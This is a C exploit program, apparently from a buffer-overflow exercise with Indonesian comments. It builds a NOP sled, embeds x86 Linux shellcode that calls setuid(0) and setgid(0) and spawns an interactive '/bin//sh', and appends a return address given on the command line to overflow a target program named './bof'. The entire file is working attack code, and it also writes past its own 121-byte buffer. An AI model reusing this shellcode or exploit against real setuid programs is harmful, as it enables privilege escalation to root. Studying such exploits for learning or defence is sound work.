#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

char *prog = "./bof"; // eksekusi vulnerable program


char sc[] =

"\x31\xdb\x89\xd8\xb0\x17\xcd\x80"
"\x31\xdb\x89\xd8\xb0\x2e\xcd\x80"
"\x31\xd2\x52\x68\x6e\x2f\x73\x68"
"\x68\x2f\x2f\x62\x69\x89\xe3\x52"
"\x66\x68\x2d\x69\x89\xe1\x52\x51"
"\x53\x89\xe1\x6a\x0b\x58\xcd\x80"
"\x6a\x01\x58\x31\xdb\xcd\x80";

int main (int argc, char **argv) {
        char buff[121];
        int i, j;
        int addr;
        if (argc > 1)
                sscanf(*(argv+1), "%x", &addr);
        else
                exit(0);

        for (i = 0; i < 35; i++) {
                *(buff+i) = 0x90;
        }
        for (j = 0; j < 55; j++, i++) {
                *(buff+i) = *(sc+j);
        }

        for (; i + 4 < 130; i += 4) {
                memcpy(buff+i, &addr, 4);
        }
        buff[118] = 0; 	 // jumlah buffer yang ingin di alokasikan pada stack
			             // agar jumlah buffer pada program bof dapat ter-overwrite.
        fwrite(buff, strlen(buff), 1, stdout);
}
